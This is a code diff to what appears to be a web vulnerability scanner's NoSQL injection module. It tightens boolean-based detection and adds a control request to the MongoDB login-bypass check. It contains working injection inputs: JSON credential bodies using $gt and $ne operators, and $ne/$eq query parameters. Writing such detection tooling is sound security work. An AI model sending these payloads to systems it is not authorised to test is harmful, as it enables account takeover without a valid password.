@@ -79,9 +79,13 @@ async def scan(ctx: "Context", url: str, params: list[str], method: str = "GET",
         if ev_true.status and ev_true.status == ev_false.status:
             lt, lf = len(ev_true.response_body or ""), len(ev_false.response_body or "")
             delta = abs(lt - lf)
-            # true (matches everything) should look like the populated baseline;
-            # false (matches nothing) should differ — and not just be noise.
-            if delta > max(200, int(0.25 * max(base_len, 1))) and lt != base_len:
+            noise = max(200, int(0.25 * max(base_len, 1)))
+            # true ($ne: matches everything) should look like the populated
+            # baseline; false ($eq: matches nothing) should differ. Require the
+            # true branch to be at least as large as the false branch AND close
+            # to the baseline, so a plain "changed page" can't false-fire.
+            true_matches_baseline = base_len == 0 or abs(lt - base_len) <= noise
+            if delta > noise and lt > lf and true_matches_baseline:
                 async with sem:
                     ev_t2 = await ctx.http.get(merge_query(url, {f"{param}[$ne]": rand}))
                     ev_f2 = await ctx.http.get(merge_query(url, {f"{param}[$eq]": rand}))
@@ -111,28 +115,59 @@ async def scan(ctx: "Context", url: str, params: list[str], method: str = "GET",
 
 
 async def _auth_bypass(ctx, url, base) -> list[dict]:
-    """Canonical Mongo auth bypass: replace credential strings with operators."""
+    """Canonical Mongo auth bypass: replace credential strings with operators.
+
+    First sends a control POST with clearly-wrong credentials; if the endpoint
+    reports success for garbage input there is no meaningful bypass signal and
+    we bail out. Only then do we try operator-injected bodies and require the
+    same success evidence the control did NOT produce."""
+    control_ev = await _post(ctx, url, {"username": "sx-nonexistent", "password": "sx-wrong"})
+    if _post_success(control_ev):
+        return []
     candidates = [
         {"username": {"$gt": ""}, "password": {"$gt": ""}},
         {"email": {"$ne": None}, "password": {"$ne": None}},
         {"user": {"$gt": ""}, "pass": {"$gt": ""}},
     ]
     for body in candidates:
-        ev = await ctx.http.request("POST", url, json_body=body,
-                                    headers={"Content-Type": "application/json"})
-        if ev.status in (200, 201, 204) and ev.status != base.status:
-            if SUCCESS_HINT.search(ev.response_body or "") or \
-                    "set-cookie" in {k.lower() for k in ev.response_headers}:
-                return [_finding(url, "credentials", str(body), "auth_bypass", ev,
-                    "Operator-injected credentials authenticated without a valid password — "
-                    "MongoDB-style authentication bypass.", sev="critical", cvss=9.8)]
+        ev = await _post(ctx, url, body)
+        if _post_success(ev):
+            from core.poc import proof_record
+            poc = proof_record(
+                verified=True, method="POST", url=url,
+                request=f"POST {url}\nContent-Type: application/json\n\n{body}",
+                status=ev.status, excerpt=ev.response_body,
+                rationale=("Operator-injected credentials authenticated successfully while the "
+                           "control request with garbage credentials did NOT — the server treats "
+                           "attacker-supplied query operators as credential matches "
+                           "(MongoDB-style authentication bypass)."))
+            return [_finding(url, "credentials", str(body), "auth_bypass", ev,
+                "Operator-injected credentials authenticated without a valid password — "
+                "MongoDB-style authentication bypass.", sev="critical", cvss=9.8,
+                poc=poc)]
     return []
 
 
-def _finding(url, param, payload, kind, ev, evidence, *, sev=None, cvss=None) -> dict:
+async def _post(ctx, url, body):
+    return await ctx.http.request("POST", url, json_body=body,
+                                  headers={"Content-Type": "application/json"})
+
+
+def _post_success(ev) -> bool:
+    if ev.status not in (200, 201, 204):
+        return False
+    return bool(SUCCESS_HINT.search(ev.response_body or "")) or \
+        "set-cookie" in {k.lower() for k in ev.response_headers}
+
+
+def _finding(url, param, payload, kind, ev, evidence, *, sev=None, cvss=None,
+             poc=None) -> dict:
     sev_map = {"auth_bypass": ("critical", 9.8), "error": ("high", 7.5),
                "boolean": ("high", 7.5), "time": ("critical", 9.0)}
     s, c = (sev, cvss) if sev else sev_map.get(kind, ("high", 7.0))
+    meta: dict = {"detection": kind}
+    if poc is not None:
+        meta["poc"] = poc
     return {
         "category": "nosqli",
         "title": f"NoSQL injection ({kind}) in `{param}`",
@@ -141,5 +176,5 @@ def _finding(url, param, payload, kind, ev, evidence, *, sev=None, cvss=None) ->
         "evidence": evidence,
         "request": f"{ev.method} {ev.url}",
         "response": (ev.response_body or "")[:1500],
-        "metadata": {"detection": kind},
+        "metadata": meta,
     }
